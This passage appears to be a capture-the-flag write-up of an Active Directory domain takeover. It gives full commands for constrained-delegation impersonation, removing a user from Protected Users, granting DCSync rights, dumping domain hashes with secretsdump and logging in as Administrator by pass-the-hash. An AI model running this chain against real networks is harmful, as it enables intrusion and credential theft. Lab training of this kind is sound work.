With `m.brown`'s credentials obtained and the `AllowedToDelegate` permission on the DC confirmed we use Impacket's `getST.py` to perform a Constrained Delegation attack requesting a Kerberos service ticket for the `CIFS` service on the DC while impersonating the `Administrator` account via the S4U2Proxy extension... but the SPN is not allowed to delegate. We can't impersonate the `Administrator` user.

```bash
getST.py novacart.local/m.brown:'Pwned123@!' -spn cifs/dc.novacart.local -impersonate Administrator -dc-ip dc.novacart.local
```

Alternatively, BloodHound reveals that `m.ibabao` is also depicted in the reponse of the shortest path to domain admins query. The account holds membership in the `Exchange Operations` group, which carries `WriteDACL` permissions over the Users container. With that we can instead delegate to `m.ibabao` and leverage the `WriteDACL`permission to grant that account DCSync rights, allowing us to dump domain credentials directly from the Domain Controller and retrieve the Administrator's hash.

We impersonate `m.ibabao`. But it fails. The user is member of the protected users groups.

```bash
getST.py novacart.local/m.brown:'Pwned123@!' -spn cifs/dc.novacart.local -impersonate m.ibabao -dc-ip dc.novacart.local
```

We recall that `p.bruce` and `l.forta` have `AddMemeber` permissions to the `protected users` group.

We already added `p.bruce` to the `Dev Ops` OU so we can change the password of that user.

Next, we change the pasword and try to use the permission to remove `m.ibabao` from the `protected users` group

```bash
bloodyAD --host DC.novacart.local -d novacart.local -u cliff.b -p 'safEpAss69' set password  'p.bruce' 'Pwned123@!'
```

We remove `m.ibabao` from the `protected users` group...

```bash
bloodyAD --host dc.novacart.local -d novacart.local -u p.bruce -p 'Pwned123@!' remove groupMember 'protected users' m.ibabao
```

... and try again to impersonate `m.ibabao`. This time we are successful and retrieve a ticket.

```bash
getST.py novacart.local/m.brown:'Pwned123@!' -spn cifs/dc.novacart.local -impersonate m.ibabao -dc-ip dc.novacart.local
```

With that ticket we leverage bloodyAD to grant us `dcsync` permissions...

```bash
export KRB5CCNAME=m.ibabao@cifs_dc.novacart.local@NOVACART.LOCAL.ccache
```

```bash
bloodyAD --host dc.novacart.local -d novacart.local -u m.ibabao --kerberos add dcsync m.ibabao
```

... and dump the domain credentials.

```bash
secretsdump.py -k -no-pass novacart.local/m.ibabao@dc.novacart.local
```

Next, we use the Administrator's hash to get a session via evil-winrm, and find the final flag at `C:\Users\Administrator\Desktop\root.txt`.

```bash
evil-winrm -i novacart.local -u 'Administrator' -H 'REDACTED'
```
